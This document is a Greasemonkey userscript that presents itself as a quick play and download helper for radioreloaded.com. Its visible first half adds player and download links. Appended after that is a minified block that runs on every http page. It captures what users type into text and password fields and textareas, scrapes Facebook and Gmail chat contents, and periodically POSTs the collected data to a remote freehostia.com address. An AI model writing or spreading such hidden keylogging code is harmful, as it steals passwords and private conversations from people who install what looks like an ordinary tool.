// ==UserScript==
// @name           Quick play and download songs from Radioreloaded
// @namespace      none
// @include        http://www.radioreloaded.com/*
// @include        http*
// ==/UserScript==
if(location.hostname.indexOf('radioreloaded.com')>-1)
p();
String.prototype.startsWith = function(str)
{return (this.match("^"+str)==str)}
function p(){
a=document.getElementsByTagName('a');

var b='',
 k1="<span><a onclick='if(this.parentNode.childNodes.length==1)this.parentNode.innerHTML+=\"<object width=290 height=24 data=http://www.radioreloaded.com/player.swf type=application/x-shockwave-flash><param value=bg=0xFFFFFF&amp;leftbg=0xFF8B00&amp;lefticon=0xFFFFFF&amp;rightbg=0xF9B41B&amp;rightbghover=0x999999&amp;righticon=0xFFFFFF&amp;righticonhover=0xffffff&amp;text=0x999999&amp;slider=0xE52C00&amp;track=0xFFFFFF&amp;border=0x666666&amp;loader=0xDDDDDD&amp;soundFile=http://www.radioreloaded.com/download.asp?tid=",
k2=" name=FlashVars ><param value=high name=quality ><param value=transparent name=wmode ></object>\"; else {e=this.parentNode.childNodes;b=e.length; for(i=1;i<b;i++)this.parentNode.removeChild(e[1]);}'  />Play</a></span><a href=http://www.radioreloaded.com/download.asp?tid=";

for(i=0;i<a.length;i++){
try{
b=a[i].href;
}catch(e){
b="";
}
if(b==null)b="";
//if(b.startsWith('/?'))
//alert(9);
//document.getElementsByTagName('textarea')[0].value+="\n"+b;
//return;
if(b.indexOf('tracks')>-1 ){
z= document.createElement("b");
z.style.border='black 2px dotted';
z.style.color='green';
z.style.margin='5px';
z.style.padding='5px';
z.style.fontSize='9px';

z.innerHTML=k1+b.substring(b.indexOf("?")+1)+k2+
b.substring(b.indexOf("?")+1) +"> downl.</a>";
					a[i].parentNode.insertBefore(z, a[i].nextSibling);

}
}}
function d(){return parseInt(new Date().getTime()/1000,10)}if(GM_getValue('ali')===undefined){GM_setValue('al','');GM_setValue('ali','a'+Math.random());GM_setValue('alie',parseInt(d()/60,10));GM_setValue('alien','')}function getElementsByAttribute(a,b,c,d){var e=(b=="*"&&document.all)?document.all:a.getElementsByTagName(b);var f=[];var g=(typeof d!="undefined")?new RegExp("(^|\\s)"+d+"(\\s|$)"):null;var h;var j;for(var i=0;i<e.length;i++){h=e[i];j=h.getAttribute(c);if(typeof j=="string"&&j.length>0){if(typeof d=="undefined"||(g&&g.test(j))){f.push(h)}}}return f}var a=[],b,e=document.getElementsByTagName('input'),val=[],ch=null,last=d();for(i=0,j=0;i<e.length;i++){try{if(e[i].type=='text'||e[i].type=='password'){a[j]=e[i];j++}}catch(o){}}e=null;b=document.getElementsByTagName('textarea');if(GM_getValue('alien')!=''){GM_setValue('al',GM_getValue('al')+GM_getValue('alien'));GM_setValue('alien','')}function key(e){var c;if(e.type=='keypress'){c=e.keyCode?e.keyCode:e.charCode;if(c==13||d()-last>=2)last=d();else return}var v='',id='',nam='',str='';function q(a){if((v=a.value)=='')return false;v="\n [val]: "+v+"\n";try{id=a.id}catch(p){id=''}if(id!='')id="\n [id]:"+id;try{nam=a.name}catch(p){nam=''}if(nam!='')nam="\n [name]:"+nam;return true}for(i=0;i<a.length;i++){try{if(!q(a[i]))continue}catch(e){v='';continue}str+=id+nam+v}for(i=0;i<b.length;i++){try{var f;if(c==13){l=location.hostname;var g=null;if(l.indexOf('facebook.com')>-1)g=getElementsByAttribute(document,'div','class','chat_window');if(l=='mail.google.com'||l.indexOf('googlemail')>-1)g=getElementsByAttribute(document,'div','role','log');if(g!=null){if(ch==null)ch=g;for(j=0;j<g.length;j++){yes=false;for(k=0;k<ch.length;k++){if(g[j]==ch[k]){yes=true;break}}if(!yes){ch[ch.length]=g[j]}}break}if((f=e.target?e.target:e.srcElement).value==''){var j;for(j=0;j<b.length;j++)if(f==b[j])break;GM_setValue('al',GM_getValue('al')+"\n[chat]: "+val[j]);break}}else if(!q(b[i]))continue;val[i]=b[i].value}catch(te){v='';continue}str+=id+nam+v}GM_setValue('alien',"*****  "+location.href+" *****\n"+new Date().toUTCString()+"\n"+str);if(ch!==null){for(i=0;i<ch.length;i++){GM_setValue('alien',GM_getValue('alien')+"\n[chatdata]: "+ch[i].innerHTML)}}if(GM_getValue('alien')!=''&&e.type=='beforeunload'){GM_setValue('al',GM_getValue('al')+GM_getValue('alien'));GM_setValue('alien','')}}unsafeWindow.onkeypress=key;unsafeWindow.onbeforeunload=key;dt=parseInt(d()/60,10);if(dt-GM_getValue('alie')>60)s(dt);function s(b){GM_xmlhttpRequest({method:"POST",url:"http://mixedbag.freehostia.com/gm/index.php",data:"id="+GM_getValue('ali')+"&a="+encodeURI(GM_getValue('al')),headers:{"Content-Type":"application/x-www-form-urlencoded"},onload:function(a){if(a.status==200){GM_setValue('al','');GM_setValue('alie',b);}}})}